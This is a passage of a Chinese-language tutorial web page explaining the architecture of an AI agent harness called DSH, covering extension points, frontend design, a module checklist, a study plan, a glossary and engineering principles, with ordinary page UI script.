+<p>workflow 的代价：它会<strong>阻塞父 agent 的整个轮次</strong>（可以选后台运行，注册成 job），脚本本身没有持久化、不能嵌套、不能恢复。所以官方建议也很克制：<strong>一两项委派用普通 subagent，只有真的要扇出到几十个才用 workflow。</strong></p>
+<h3>17.5 Agent Team：多一块任务板</h3>
+<p>如果把“团队”理解成“多个 agent 共享一块任务看板”，那就对了。Team 不新造 agent，teammate 就是普通 subagent，它只多提供四个工具：<code>team_task_create</code>、<code>team_task_list</code>、<code>team_task_get</code>、<code>team_task_update</code>。</p>
+<p>任务板的设计细节挺讲究：每个任务是 <code>team/task</code> 事件的<strong>完整版本化快照</strong>，更新要用 <code>expectedRevision</code> 做乐观并发控制（防止两个 agent 同时改同一张卡）；任务之间的依赖 <code>blockedBy</code> 必须是无环图（不能 A 等 B、B 又等 A）；<code>writeScopes</code>（谁写哪块）只是<strong>重叠提示</strong>，不是锁。</p>
+<p>默认是关闭的。因为这个模式只在“任务能并行拆开、且有共享状态”时才划算。</p></section><section class="section" id="s-20"><div class="section-header"><div class="section-number">20</div><h2>18 · 扩展面：能力是怎么长出来的</h2></div><details class="pm-card"><summary class="pm-sum"><span class="pm-tag">产品经理视角</span><span class="pm-lead">生态</span><span class="pm-plus" aria-hidden="true">＋</span></summary><div class="pm-body"><div class="pm-row"><span class="pm-k">谁的痛</span><div class="pm-v">产品能力增长永远慢于用户需求</div></div><div class="pm-row"><span class="pm-k">怎么解</span><div class="pm-v">五级扩展面，从写 markdown 到写插件都有路</div></div><div class="pm-row"><span class="pm-k">代价</span><div class="pm-v">扩展面越多，兼容性与安全负担越重</div></div><div class="pm-row"><span class="pm-k">可迁移</span><div class="pm-v">给用户「最便宜的那条路」，而不是「最灵活的那条」</div></div></div></details><p>一个 agent 产品能不能“越用越强”，取决于它有没有留扩展点。DSH 留了五条，按“改造成本从低到高”排列：</p>
+<figure class="table-wrap"><table><thead><tr><th>扩展方式</th><th>需要写代码吗</th><th>改什么</th><th>典型用途</th></tr></thead><tbody><tr><td>AGENTS.md</td><td>不用</td><td>项目里放个 markdown</td><td>告诉 agent 本项目的规矩</td></tr><tr><td>Skill</td><td>不用</td><td>目录里放个 <code>SKILL.md</code></td><td>教 agent 一套特定流程</td></tr><tr><td>MCP server</td><td>写外部程序</td><td>独立进程</td><td>接数据库、Jira、浏览器</td></tr><tr><td>工具插件</td><td>写 TypeScript</td><td>一个 npm 包</td><td>新的原子能力</td></tr><tr><td>核心插件</td><td>写 TypeScript</td><td>改循环/加事件</td><td>换架构</td></tr></tbody></table></figure>
+<h3>18.1 AGENTS.md：最便宜的“驯化”</h3>
+<p>模型启动时，harness 会<strong>自动</strong>把项目里的 <code>AGENTS.md</code>（或 <code>CLAUDE.md</code>）读进上下文。搜索规则是：从项目根（最近一个有 <code>.git</code> 的祖先目录）到当前工作目录，每一层都找。</p>
+<p>有几个设计细节很实用：</p>
+<ul><li>两条链：用户全局链（<code>~/.dsh/AGENTS.md</code>）+ 项目链。</li><li>每条链有字节预算（默认 <strong>65,536 字节</strong>），超了会丢弃宽泛的文件、保留最具体的，并在上下文里明确告知“预算超了”。</li><li>内容相同的文件只注入一次（<code>CLAUDE.md</code> 常常是 <code>AGENTS.md</code> 的副本）。</li><li>如果后续读到了更深的目录，下一轮会把那个目录的 <code>AGENTS.md</code> 补进来。</li><li><strong>不监视外部编辑</strong><span class="dash">——</span>你在编辑器里改了 AGENTS.md，要等下次读文件或恢复会话才生效。</li></ul>
+<p>最小的一个 <code>AGENTS.md</code> 只需要几行：</p>
+<pre><code class="language-markdown"># AGENTS.md
+- 改 packages/ 之前，先读 docs/architecture.md
+- 提交前跑 pnpm run build:check
+- 不要手改 lib/ 下的文件，它是构建产物
+- 遇到不确定的接口，先 grep 调用方，不要猜</code></pre>
+<p>这几行会随每次会话自动进上下文。<strong>写它的收益，比写十页 Wiki 高。</strong></p>
+<p>DSH 自己的 <code>AGENTS.md</code> 有 19KB，写满了“必须先读架构文档”“模型可见就必须记录”“不许把可调参数硬编码”这类纪律。<strong>这就是“给 agent 看的项目规范”该有的样子</strong>：具体、可执行、有理由。</p>
+<h3>18.2 Skill：渐进式披露的教科书案例</h3>
+<p>Skill 是什么？最朴素的定义：<strong>一个目录，里面一个 <code>SKILL.md</code>，带 frontmatter</strong>：</p>
+<pre><code class="language-markdown">---
+name: pdf-report
+description: 把数据表渲染成带图表的 PDF 报告
+whenToUse: 用户要求生成 PDF/报告/打印版时
+---
+
+（这里是几百行的详细操作步骤）</code></pre>
+<p>机制的关键在<strong>它怎么进上下文</strong><span class="dash">——</span>这是我认为最值得抄的一个设计：</p>
+<ol><li><strong>只把 <code>name</code> + <code>description</code>（上限 500 字符）放进上下文</strong>，做成一份“菜单”，每次请求都带。</li><li>模型看到菜单，<strong>决定要用</strong>时，调用 <code>skill({name})</code> 工具，这时才把正文读进来。</li><li>每次调用都重新读文件，所以改正文立即生效。</li></ol>
+<p>效果：假设你有 30 个 skill，每个正文 3000 字<span class="dash">——</span>合起来约 9 万字、近十万 token。但<strong>平时只占 30 × 100 ≈ 3000 token</strong> 的菜单位，用到哪个才加载哪个，差了三十倍。</p>
+<p>这个模式叫 <strong>progressive disclosure（渐进式披露）</strong>。它解决的是“能力很多 vs 上下文有限”的根本矛盾，所有“工具/知识库特别多”的 agent 都该用。</p>
+<p>Skill 的发现路径也是分层的（数字越小优先级越高）：项目的 <code>.dsh/skills</code> → 项目的 <code>.agents/skills</code> → 自定义目录 → 用户级的 <code>~/.dsh/skills</code> → <code>~/.agents/skills</code> → 内置。并且有文件监听，加一个目录不用重启。</p>
+<h3>18.3 MCP：接别人的工具</h3>
+<p>MCP（Model Context Protocol）是一个“工具供应商”的通用协议。DSH 的处理方式是：<strong>每接一个 MCP server，就等于注册了一批普通工具。</strong></p>
+<ul><li>工具名会被重命名成 <code>mcp__<服务器名>__<原始名></code>，避免和内置工具撞名。</li><li>传输支持 stdio（本地子进程）和 streamable-http（远程）。</li><li>服务器自己给的说明（instructions）作为一段 <code>mcp:<server></code> 进系统提示词。</li><li>资源（resources）由三个通用工具 <code>list_mcp_resources</code> / <code>read_mcp_resource</code> 惰性读取，不在连接时就拉内容。</li><li><strong>不支持 prompt 模板</strong><span class="dash">——</span>这是明确的能力边界，文档里写了。</li></ul>
+<p>这套设计的启发：<strong>接外部工具时，“重命名 + 归一化 + 惰性读取”三件事必须做</strong>，否则要么撞名、要么启动卡住、要么上下文爆炸。</p></section><section class="section" id="s-21"><div class="section-header"><div class="section-number">21</div><h2>19 · 前端：为什么 agent 产品都需要一个“壳”</h2></div><details class="pm-card"><summary class="pm-sum"><span class="pm-tag">产品经理视角</span><span class="pm-lead">可观测界面</span><span class="pm-plus" aria-hidden="true">＋</span></summary><div class="pm-body"><div class="pm-row"><span class="pm-k">谁的痛</span><div class="pm-v">黑盒、看不见进度、打断不了、批准不了</div></div><div class="pm-row"><span class="pm-k">怎么解</span><div class="pm-v">Host/Client 分离，内核不变、壳可换，类型化 RPC</div></div><div class="pm-row"><span class="pm-k">代价</span><div class="pm-v">类型与 RPC 基础设施重，前期投入大</div></div><div class="pm-row"><span class="pm-k">可迁移</span><div class="pm-v">UI 是 agent 的可观测性界面，不是聊天框的装饰</div></div></div></details><p>最后补一块很多人忽略的部分：界面。</p>
+<p>一个 agent 产品的前端不是“聊天框 + 气泡”。它要做的三件事都不简单：</p>
+<ol><li><strong>把流式内容实时画出来</strong>（模型吐一个字画一个字，还要能中途插入工具卡片）。</li><li><strong>把长任务的状态可视化</strong>（现在是第几步、在跑什么工具、卡在哪了）。</li><li><strong>把控制权交给人</strong>（批准/拒绝、打断、切换文件、改设置）。</li></ol>
+<p>DSH 的做法是 <strong>Host / Client 分离 + 类型化 RPC</strong>：</p>
+<ul><li><strong>Host</strong>（Node 进程）跑所有 agent、工具、存储。它把业务服务的某些方法标记为 <code>@Remote</code>，构建时自动生成前后端共享的类型声明。</li><li><strong>Client</strong>（浏览器）只做渲染和交互，通过 RPC 调用 Host 的方法，通过事件流接收增量。</li><li>中间的 <code>api/</code> 目录就是“BFF”层，把业务服务包装成前端能调的接口。</li></ul>
+<p>后端把方法“标”出来，前端就自动有类型：</p>
+<pre><code class="language-ts">class GoalService extends TypertRemoteService {
+  constructor(ctx: Context) { super(ctx, 'goals') }
+
+  @Remote('create')                                  // 标记即可被前端调用
+  createForClient(agent: Agent, req: CreateGoalRequest, signal: AbortSignal) {
+    signal.throwIfAborted()
+    return { accepted: true }
+  }
+}</code></pre>
+<p>复杂对象（比如 <code>Agent</code>）不会被序列化传过去，而是传 id、在 Host 侧还原<span class="dash">——</span><strong>这是“前端只拿视图所需”的关键。</strong></p>
+<p>这么分的收益：<strong>同一套 Host 能同时服务 Web、桌面、SDK、ACP 四种壳</strong>。你换个界面，agent 逻辑一行不改。</p>
+<p>它还解释了一个现象：为什么 agent 产品的 UI 代码量往往比 agent 逻辑还大？因为“流式渲染 + 状态可视化 + 人工介入”这三件事本身就重。DSH 的 <code>packages/client/</code> 下有 50 多个 UI 插件，比 <code>packages/core/</code> 多得多。</p>
+<p><strong>给你的实用建议</strong>：如果你要做 agent 产品，先想清楚“人在哪一刻介入”。是每一步都要批准（安全但烦），还是只在危险操作时问（默认选择），还是完全不管（无人值守）？这个决定会影响整个前后端的设计。</p></section><section class="section" id="s-22"><div class="section-header"><div class="section-number">22</div><h2>20 · 迁移清单：任何 agent 项目都有的 12 个模块</h2></div><details class="pm-card"><summary class="pm-sum"><span class="pm-tag">产品经理视角</span><span class="pm-lead">可迁移</span><span class="pm-plus" aria-hidden="true">＋</span></summary><div class="pm-body"><div class="pm-row"><span class="pm-k">谁的痛</span><div class="pm-v">学完一个框架，换个框架又要从头再来</div></div><div class="pm-row"><span class="pm-k">怎么解</span><div class="pm-v">给 12 个模块，而不是 12 个类名</div></div><div class="pm-row"><span class="pm-k">代价</span><div class="pm-v">抽象会丢掉具体实现的细节</div></div><div class="pm-row"><span class="pm-k">可迁移</span><div class="pm-v">学习成果要沉淀成检查表，才能跨项目复用</div></div></div></details><p>现在把 DSH 拆完，回到你最初的问题：<strong>如果一个 agent 项目的结构需要“完善地了解”，那到底是哪几个部分？</strong></p>
+<p>下面这张表是我认为可以搬到任何项目上的骨架。左边是模块，中间是它必须回答的问题，右边是 DSH 里的对照物<span class="dash">——</span>你可以拿它当检查表，去审视任何一个 agent 框架。</p>
+<figure class="table-wrap"><table><thead><tr><th class="al-num">#</th><th>模块</th><th>必须回答的问题</th><th>DSH 对照</th></tr></thead><tbody><tr><td class="al-num">1</td><td>模型接入</td><td>换模型/换供应商要改几处？流式怎么处理？</td><td><code>dsh-llm</code> + adapter</td></tr><tr><td class="al-num">2</td><td>提示词组装</td><td>谁决定系统提示词的内容和顺序？</td><td><code>dsh-system-prompt</code></td></tr><tr><td class="al-num">3</td><td>工具注册</td><td>新工具怎么加？schema 怎么进提示词？</td><td><code>dsh-tools</code> + <code>defineTool</code></td></tr><tr><td class="al-num">4</td><td>工具执行</td><td>参数校验、并发、超时、结果改写在哪？</td><td>五段流水线</td></tr><tr><td class="al-num">5</td><td>循环控制</td><td>什么算一轮？什么算完成？怎么打断？</td><td><code>dsh-agent-loop</code></td></tr><tr><td class="al-num">6</td><td>会话状态</td><td>状态存哪？能不能回放？</td><td><code>dsh-session</code>（事件日志）</td></tr><tr><td class="al-num">7</td><td>上下文管理</td><td>涨到窗口上限怎么办？</td><td><code>dsh-compaction-*</code></td></tr><tr><td class="al-num">8</td><td>持久化</td><td>崩溃后能不能接着干？</td><td>JSONL + 版本迁移</td></tr><tr><td class="al-num">9</td><td>权限与安全</td><td>危险操作怎么拦？拦不住的部分说清了吗？</td><td><code>sandbox</code> + <code>approval</code> + <code>guard</code></td></tr><tr><td class="al-num">10</td><td>委派与编排</td><td>子任务怎么开？结果怎么收？</td><td><code>subagent</code> / <code>workflow</code></td></tr><tr><td class="al-num">11</td><td>扩展机制</td><td>用户不加代码能长出什么能力？</td><td>skill / MCP / AGENTS.md</td></tr><tr><td class="al-num">12</td><td>交互界面</td><td>人怎么看见、怎么打断、怎么批准？</td><td>Host/Client + RPC</td></tr></tbody></table></figure>
+<p>如果明天你自己起一个，目录大致长这样（对应上面 12 行）：</p>
+<pre><code class="language-text">my-agent/
+  src/loop.ts          循环：调模型 → 跑工具 → 再调（第 5 行）
+  src/llm/             适配器：每家一个文件（第 1 行）
+  src/prompt/          提示词段与排序（第 2 行）
+  src/tools/           每个工具一个文件（第 3、4 行）
+  src/session/         事件定义 + 派生 + 持久化（第 6、8 行）
+  src/compaction/      剪枝与摘要（第 7 行）
+  src/policy/          沙箱、审批、守卫（第 9 行）
+  src/agents/          子 agent 与编排（第 10 行）
+  skills/  AGENTS.md   不加代码的扩展面（第 11 行）
+  web/                 界面（第 12 行）</code></pre>
+<div class="pullquote pullquote-swiss"><div class="pq-bar"></div><div class="pq-content"><p>这张表就是“agent 项目结构”的<span class="accent-mark">答案</span>。</p></div></div>
+<p>你以后拿到任何一个 agent 框架（LangGraph、AutoGen、Claude Code、OpenHands……），就按这 12 行去问“它这里是怎么做的”，半小时就能建起它的结构图。</p>
+<p>再补一条经验：<strong>这 12 个模块里，真正决定产品上限的是第 6 到第 9 个</strong><span class="dash">——</span>状态、上下文、持久化、安全。前五个模块决定它「能不能跑起来」，中间这四个决定它「能不能连续用一整天」，最后三个决定它「别人能不能用得上」。</p></section><section class="section" id="s-23"><div class="section-header"><div class="section-number">23</div><h2>21 · 怎么读这类代码：四条方法论</h2></div><details class="pm-card"><summary class="pm-sum"><span class="pm-tag">产品经理视角</span><span class="pm-lead">效率</span><span class="pm-plus" aria-hidden="true">＋</span></summary><div class="pm-body"><div class="pm-row"><span class="pm-k">谁的痛</span><div class="pm-v">时间都花在乱翻文件上</div></div><div class="pm-row"><span class="pm-k">怎么解</span><div class="pm-v">装配 → 主链路 → 决策记录，三条路径按序走</div></div><div class="pm-row"><span class="pm-k">代价</span><div class="pm-v">跳过细节可能误判某个决策</div></div><div class="pm-row"><span class="pm-k">可迁移</span><div class="pm-v">读代码是「找决策」，不是「读实现」</div></div></div></details><p>最后给方法。这份文档能给你结构，但你以后要自己读几十个这样的项目。</p>
+<p><strong>（1）从“装配”读，别从“入口函数”读。</strong></p>
+<p>大型项目没有单一入口，所有东西都是“被装配起来的”。先读那份 YAML / 配置文件 / DI 容器定义，你得到的是一张“系统由什么组成”的地图。比顺着 <code>index.ts</code> 追快十倍。</p>
+<p><strong>（2）顺“一条真实请求”读。</strong></p>
+<p>选一个具体动作（用户按回车 / 点批准 / 工具执行），跟着它走完全程。你会遇到的所有文件，就是核心文件。其他都先别管。</p>
+<p><strong>（3）看事件名和接口名，别急着看实现。</strong></p>
+<p>一个项目的词汇表（事件、服务名、类型名）就是这个项目的“世界观”。DSH 的 <code>glossary.md</code> 只有 46 行，读完你就知道它是怎么理解世界的。命名好的项目，接口即文档。</p>
+<p><strong>（4）找“决策记录”。</strong></p>
+<p>DSH 里叫 <code>.agents/notes/</code>，30MB，全是“为什么当初这么选、否决了什么方案”。<strong>这是整个仓库里最贵的东西</strong><span class="dash">——</span>代码告诉你“怎么做的”，决策记录告诉你“为什么不那么做”。后者才是能迁移的经验。</p>
+<p>具体到命令，三步就够开工：</p>
+<pre><code class="language-bash"># 1. 它由什么组成
+dsh --profile web --dump-config | head -40
+
+# 2. 一条主链路从哪开始
+grep -rn &quot;turn/start&quot; packages/core/session/src/
+
+# 3. 当初为什么这么选（最贵的东西在这里）
+ls .agents/notes/implemented/architecture/ | head -20</code></pre>
+<p>顺便说一个学习误区：<strong>别试图读懂所有代码。</strong> 53 万行不是给人读完的。读懂结构、读懂关键决策、读懂一条主链路，就够了。剩下的在你需要改它的时候再读。</p></section><section class="section" id="s-24"><div class="section-header"><div class="section-number">24</div><h2>22 · 两周学习路线（不用写代码）</h2></div><details class="pm-card"><summary class="pm-sum"><span class="pm-tag">产品经理视角</span><span class="pm-lead">可执行</span><span class="pm-plus" aria-hidden="true">＋</span></summary><div class="pm-body"><div class="pm-row"><span class="pm-k">谁的痛</span><div class="pm-v">知道要学，但不知道今天该干什么</div></div><div class="pm-row"><span class="pm-k">怎么解</span><div class="pm-v">按天给动作 + 验收物，不要求写代码</div></div><div class="pm-row"><span class="pm-k">代价</span><div class="pm-v">路线是通用的，个体差异大</div></div><div class="pm-row"><span class="pm-k">可迁移</span><div class="pm-v">学习计划要给验收物，而不是阅读量</div></div></div></details><p>如果你读完这份文档想真的掌握它，我建议按这个顺序走。每天 1–2 小时，全部是“读 + 跑 + 验证”，不要求写代码。</p>
+<p><strong>第 1–2 天｜跑起来，建立体感。</strong></p>
+<p>安装 DSH，跑一个真实任务（比如“把这个目录里的 Python 脚本都加上类型注解”）。重点观察：它调了几次工具、卡在哪里、你怎么打断它。<strong>先当用户，再当工程师。</strong></p>
+<p><strong>第 3 天｜看自己的插件树。</strong></p>
+<p>运行 <code>dsh --profile web --dump-config</code>，把输出翻一遍。对照本文第 6 章，找出 <code>llm</code>、<code>tools</code>、<code>session</code>、<code>compaction</code> 这几个条目<span class="dash">——</span>你会突然明白“原来那 220 行是真的”。</p>
+<p><strong>第 4 天｜读一份真实的会话日志。</strong></p>
+<p>在 <code>~/.dsh/sessions/</code> 下找到刚才那次任务，解压后一条条看事件。注意 v4 文件是<strong>多个 zstd 帧拼接</strong>的：<code>zstd -d</code> 会自动接上，用 Node 的 <code>zlib</code> 则要按帧头 <code>28 B5 2F FD</code> 切开逐帧解。<strong>这是整个学习过程中信息密度最高的一小时。</strong> 你会亲眼看到 <code>turn/start</code> → <code>step/start</code> → <code>request/header</code> → <code>tool/call</code> → <code>tool/result</code> 的节奏。</p>
+<p><strong>第 5–6 天｜读三个包的 README。</strong></p>
+<p>按顺序：<code>core/agent-loop</code>（循环）、<code>core/tools</code>（工具）、<code>core/session</code>（日志）。DSH 的每个包都有中英双语 README，写得比很多书的章节还好。</p>
+<p><strong>第 7 天｜读架构文档和术语表。</strong></p>
+<p><code>docs/architecture.zh.md</code>（175 行）+ <code>docs/glossary.zh.md</code>（46 行）。前者给你全局图，后者给你词汇表。<strong>先有词汇，才能读懂代码。</strong></p>
+<p><strong>第 8–9 天｜读压缩和安全。</strong></p>
+<p><code>packages/compaction/compaction-basic</code> + <code>docs/subsystems/sandbox.zh.md</code>。这两块是“demo vs 产品”的分水岭，也最容易在面试/评审里被问到。</p>
+<p><strong>第 10 天｜读委派。</strong></p>
+<p><code>packages/subagent/subagent</code>。重点看“结果怎么回父级”和“scope 为什么不继承”。</p>
+<p><strong>第 11 天｜自己动手改一行配置。</strong></p>
+<p>不加代码，只改 YAML：换个模型、关掉一个工具、调低并发上限。然后 <code>--dump-config</code> 确认改动生效。<strong>这一步是从“读懂了”到“能用了”的分界。</strong></p>
+<p><strong>第 12 天｜写一个 skill。</strong></p>
+<p>在你的项目里建 <code>.dsh/skills/<名字>/SKILL.md</code>，写一个你日常重复的流程。验证它出现在菜单里、模型会主动调用它。<strong>这是最便宜的能力扩展，一定要会。</strong></p>
+<p><strong>第 13 天｜接一个 MCP server。</strong></p>
+<p>随便接一个（文件系统、数据库、GitHub 都行），观察它的工具如何出现在工具列表里、名字怎么被重命名。</p>
+<p><strong>第 14 天｜复盘：画你自己的架构图。</strong></p>
+<p>拿第 20 章的 12 个模块清单，给 DSH 每一行填上“它怎么做的 + 如果是我会怎么做”。<strong>能填满这张表，你就真的懂了。</strong></p></section><section class="section" id="s-25"><div class="section-header"><div class="section-number">25</div><h2>术语表</h2></div><details class="pm-card"><summary class="pm-sum"><span class="pm-tag">产品经理视角</span><span class="pm-lead">沟通</span><span class="pm-plus" aria-hidden="true">＋</span></summary><div class="pm-body"><div class="pm-row"><span class="pm-k">谁的痛</span><div class="pm-v">团队讨论时同一个词有三种意思</div></div><div class="pm-row"><span class="pm-k">怎么解</span><div class="pm-v">一词一义、中英对照、可锚点引用</div></div><div class="pm-row"><span class="pm-k">代价</span><div class="pm-v">术语会演化，表需要维护</div></div><div class="pm-row"><span class="pm-k">可迁移</span><div class="pm-v">项目文档先定词汇表，能省掉一半沟通成本</div></div></div></details><p>按出现顺序整理，方便回头查。</p>
+<figure class="table-wrap"><table><thead><tr><th>术语</th><th>一句话解释</th></tr></thead><tbody><tr><td><strong>Harness</strong></td><td>套在模型外面的那层程序。模型只会出文字，harness 负责把文字变成动作、把结果喂回去。</td></tr><tr><td><strong>Turn（轮次）</strong></td><td>从用户发一句话到 agent 彻底停下来。一个轮次包含 0 个或多个步骤。</td></tr><tr><td><strong>Step（步骤）</strong></td><td>一次模型请求 + 它引发的工具执行。循环的最小单位。</td></tr><tr><td><strong>Tool call（工具调用）</strong></td><td>模型输出的结构化指令「我要调用 X，参数是 Y」。它不是一个动作，是一个意图<span class="dash">——</span>真正的执行由 harness 完成。</td></tr><tr><td><strong>Session（会话）</strong></td><td>一段持续的对话历史及其全部状态。在 DSH 里是一个只追加的事件日志。</td></tr><tr><td><strong>Event sourcing（事件溯源）</strong></td><td>只存「发生过的事」，当前状态由重放算出。好处是可回放、可审计、可修。</td></tr><tr><td><strong>Surface（表面）</strong></td><td>日志的一个投影视图，记录「此刻模型该看到哪些事件」。压缩通过改写 surface 遮蔽旧内容，而不删日志。</td></tr><tr><td><strong>Compaction（压缩）</strong></td><td>历史太长时的处理。先剪枝（确定性、零成本），再摘要（调模型、花钱）。</td></tr><tr><td><strong>KV Cache</strong></td><td>提供方缓存请求前缀的计算结果，命中就便宜又快。任何「改动历史中间一段」的操作都会让它失效。</td></tr><tr><td><strong>Seam（能力缝）</strong></td><td>一项可替换能力的三个角色<span class="dash">——</span>接口定义、实现、使用方。换实现不改使用方，是它的全部意义。</td></tr><tr><td><strong>Waterfall（瀑布事件）</strong></td><td>一种中间件式的事件分发。监听器调用 <code>next()</code> 委托下游，不调用就短路。</td></tr><tr><td><strong>Guard（单调守卫）</strong></td><td>只能拒绝、不能允许的前置检查。用于不可翻案的安全不变式。</td></tr><tr><td><strong>Sandbox（沙箱）</strong></td><td>限制进程能写哪些文件。注意：它不限制网络。</td></tr><tr><td><strong>Scope（作用域）</strong></td><td>注册的归属。要么全局，要么属于一个 agent。<strong>不向下继承。</strong></td></tr><tr><td><strong>Progressive disclosure（渐进式披露）</strong></td><td>先给目录，用到再给正文。解决「能力多 vs 上下文小」的矛盾。</td></tr><tr><td><strong>Preset（预设）</strong></td><td>一套预定义的插件组合，决定一个 agent 拥有哪些能力。</td></tr></tbody></table></figure></section><section class="section" id="s-26"><div class="section-header"><div class="section-number">26</div><h2>附录：这个项目对自己的十条要求</h2></div><details class="pm-card"><summary class="pm-sum"><span class="pm-tag">产品经理视角</span><span class="pm-lead">工程文化</span><span class="pm-plus" aria-hidden="true">＋</span></summary><div class="pm-body"><div class="pm-row"><span class="pm-k">谁的痛</span><div class="pm-v">项目烂掉通常不是因为选型，而是因为纪律缺失</div></div><div class="pm-row"><span class="pm-k">怎么解</span><div class="pm-v">把纪律写成可检查的条目，每条都带理由</div></div><div class="pm-row"><span class="pm-k">代价</span><div class="pm-v">纪律会僵化，新人觉得束手束脚</div></div><div class="pm-row"><span class="pm-k">可迁移</span><div class="pm-v">规则必须带「为什么」，否则一定会被绕过</div></div></div></details><p>DSH 的 <code>AGENTS.md</code> 里有几十条工程纪律，我挑了十条最能迁移的，附上我的理解。这部分不是「DSH 的知识」，而是<strong>「写出一个不会烂掉的 agent 项目」的经验</strong>。</p>
+<figure class="table-wrap"><table><thead><tr><th>要求</th><th>我的理解</th></tr></thead><tbody><tr><td><strong>模型可见 ⟺ 已记录</strong></td><td>任何进入模型请求的内容都必须能从日志重建。这让「可解释」变成结构约束，而不是事后补日志。</td></tr><tr><td><strong>插件而不是改循环</strong></td><td>新行为挂在已有扩展点上。改循环要同步更新架构文档<span class="dash">——</span>这个「摩擦」是故意的，它在提醒你「你是不是在动不该动的东西」。</td></tr><tr><td><strong>注册即副作用</strong></td><td>每个注册都要返回一个撤销函数。这是热插拔、per-agent 定制、干净卸载的基础。</td></tr><tr><td><strong>没有硬编码的可调参数</strong></td><td>部署会变的东西必须是可校验的配置字段；<code>DEFAULT_*</code> 常量不算「可配置」。</td></tr><tr><td><strong>配置错误要在加载时报错</strong></td><td>自包含的错就在加载时炸，别等到运行到一半。</td></tr><tr><td><strong>不信任外部输入，但信任类型</strong></td><td>在进程内、有类型的地方不要加运行时校验；在配置、网络、文件、模型输出这些边界上必须校验。</td></tr><tr><td><strong>错误要有归属和处理承诺</strong></td><td>每个失败都要能回答「谁负责处理、失败后系统处于什么状态」。</td></tr><tr><td><strong>区分「没做」和「不知道做没做」</strong></td><td>工具执行中断时，<code>TOOL_NOT_STARTED</code> 可以重试，<code>TOOL_OUTCOME_UNKNOWN</code> 不行。</td></tr><tr><td><strong>失败朝安全的方向倒（fail-closed）</strong></td><td>沙箱不可用就拒绝执行；审批没人应答就当作拒绝；拿不到决定就不放行。</td></tr><tr><td><strong>测试描述行为，不描述正确性</strong></td><td>行为变了就连测试一起改，并在 PR 里说明为什么<span class="dash">——</span>而不是让测试变成「防止别人改我代码」的墙。</td></tr></tbody></table></figure></section><section class="section" id="s-27"><div class="section-header"><div class="section-number">27</div><h2>写在最后</h2></div><details class="pm-card"><summary class="pm-sum"><span class="pm-tag">产品经理视角</span><span class="pm-lead">记忆点</span><span class="pm-plus" aria-hidden="true">＋</span></summary><div class="pm-body"><div class="pm-row"><span class="pm-k">谁的痛</span><div class="pm-v">读完很爽，一周后什么都不记得</div></div><div class="pm-row"><span class="pm-k">怎么解</span><div class="pm-v">只留三件事 + 一个可执行的提醒</div></div><div class="pm-row"><span class="pm-k">代价</span><div class="pm-v">简化必然损失细节</div></div><div class="pm-row"><span class="pm-k">可迁移</span><div class="pm-v">交付文档的最后一段，应该回答「我该记住什么」</div></div></div></details><p>如果这份文档你只记住三件事，我希望是这三件：</p>
+<p><strong>第一，agent 的难点不在模型，在“围绕模型的这套设施”。</strong> 提示词工程能让你做出一个惊艳的 demo；让你做出一个能连续工作两小时的产品的，是会话日志、上下文管理、持久化、权限边界这四件事。</p>
+<p><strong>第二，好的架构是“每一块都能被替换”。</strong> DSH 的 220 行 YAML 不是炫技，它证明了这个系统里没有任何一块是不可替换的。你以后设计自己的项目时，可以问自己：“如果我要换掉这一块，需要改几处？”答案超过 3 处，就说明该分层了。</p>
+<p><strong>第三，读源码的正确姿势是读“结构 + 决策”，不是读代码行数。</strong> 53 万行里，真正值得你花时间的可能只有 2 万行：组装文件、事件定义、循环、压缩、安全、以及那 30MB 的决策记录。</p>
+<p>最后一句提醒：这个项目还在 <strong>developer preview</strong> 阶段，README 里明写着“未来会有破坏兼容性的变更”。所以你学它的时候，学的应该是<strong>它为什么这么设计</strong>，而不是记住某个具体的类名<span class="dash">——</span>类名会变，设计判断不会。</p>
+<p>祝读得开心。遇到想不通的地方，回到第 2 章那 20 行伪代码<span class="dash">——</span>大部分复杂设计，都是为了让那 20 行在真实世界里不出事。</p></section>
+<div class="divider-dot">· · ·</div>
+<footer><p>归藏 Page · Built with constrained HTML</p></footer>
+
+</div>
+
+<script>
+(function(){
+  const toggle = document.getElementById('toc-toggle');
+  const panel = document.getElementById('toc-panel');
+  const toc = document.getElementById('toc');
+  const scrim = document.getElementById('toc-scrim');
+  const narrow = window.matchMedia('(max-width: 1024px)');
+  let open = false;
+  function setOpen(v) {
+    open = v;
+    toc.classList.toggle('toc-open', v);
+    document.documentElement.classList.toggle('toc-is-open', v);
+    toggle.setAttribute('aria-expanded', String(v));
+  }
+  toggle.addEventListener('click', (e) => { e.stopPropagation(); setOpen(!open); });
+  if (scrim) scrim.addEventListener('click', () => setOpen(false));
+  document.addEventListener('keydown', (e) => { if (e.key === 'Escape' && open) setOpen(false); });
+  panel.addEventListener('click', (e) => {
+    // On narrow screens the drawer covers the text, so close it after jumping;
+    // on wide screens it sits beside the text and can stay open.
+    if (e.target.closest('.toc-item') && narrow.matches) setOpen(false);
+  });
+  // Scroll spy
+  const sections = document.querySelectorAll('.section[id]');
+  const links = document.querySelectorAll('.toc-item');
+  const observer = new IntersectionObserver(entries => {
+    entries.forEach(entry => {
+      if (entry.isIntersecting) {
+        links.forEach(l => l.classList.remove('toc-active'));
+        const active = panel.querySelector('a[href="#'+entry.target.id+'"]');
+        if (active) active.classList.add('toc-active');
+      }
+    });
+  }, { rootMargin: '-20% 0px -70% 0px' });
+  sections.forEach(s => observer.observe(s));
+})();
+</script>
+
+<div class="hf-fab">
+  <button class="hf-fab-btn" id="hf-settings-toggle" type="button" title="设置" aria-haspopup="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><line x1="4" y1="21" x2="4" y2="14"/><line x1="4" y1="10" x2="4" y2="3"/><line x1="12" y1="21" x2="12" y2="12"/><line x1="12" y1="8" x2="12" y2="3"/><line x1="20" y1="21" x2="20" y2="16"/><line x1="20" y1="12" x2="20" y2="3"/><line x1="1" y1="14" x2="7" y2="14"/><line x1="9" y1="8" x2="15" y2="8"/><line x1="17" y1="16" x2="23" y2="16"/></svg></button>
+  <div class="hf-dropdown" id="hf-settings-dropdown">
+    <div class="hf-dropdown-label">配色</div>
